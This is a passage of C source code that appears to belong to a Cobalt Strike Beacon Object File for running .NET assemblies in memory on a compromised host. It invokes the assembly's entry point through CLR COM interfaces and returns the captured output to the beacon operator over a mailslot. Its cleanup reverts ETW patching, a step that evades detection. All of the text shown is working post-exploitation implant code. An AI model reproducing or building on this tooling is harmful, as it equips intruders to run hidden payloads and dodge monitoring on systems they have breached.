    ZeroMemory(&ctx.retVal, sizeof(VARIANT));
    ZeroMemory(&ctx.obj, sizeof(VARIANT));
    ctx.obj.vt = VT_NULL;

    ctx.psaStaticMethodArgs = OLEAUT32$SafeArrayCreateVector(VT_VARIANT, 0, (ULONG)entryPoint);
    if (!ctx.psaStaticMethodArgs) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create method args array");
        SetStdHandle(((DWORD)-11), stdOutput);
        PerformCleanup(&ctx, frConsole, revertETW);
        return;
    }

    long idx[1] = { 0 };
    OLEAUT32$SafeArrayPutElement(ctx.psaStaticMethodArgs, idx, &ctx.vtPsa);

    //Invoke our .NET Method
    hr = ctx.pMethodInfo->lpVtbl->Invoke_3(ctx.pMethodInfo, ctx.obj, ctx.psaStaticMethodArgs, &ctx.retVal);

    // Use hybrid reading for mailslots with improved chunking
    BOOL bufferMode = ReadSlotHybrid(ctx.returnData, ctx.returnDataSize, &ctx.mainHandle, &ctx.hEvent);
    ctx.useChunking = !bufferMode;

    // Send output only if not already sent in chunks
    if (!ctx.useChunking) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n\n%s\n", ctx.returnData);
    }

    //Revert stdout back to original handles
    SetStdHandle(((DWORD)-11), stdOutput);

    //Cleanup everything
    PerformCleanup(&ctx, frConsole, revertETW);
}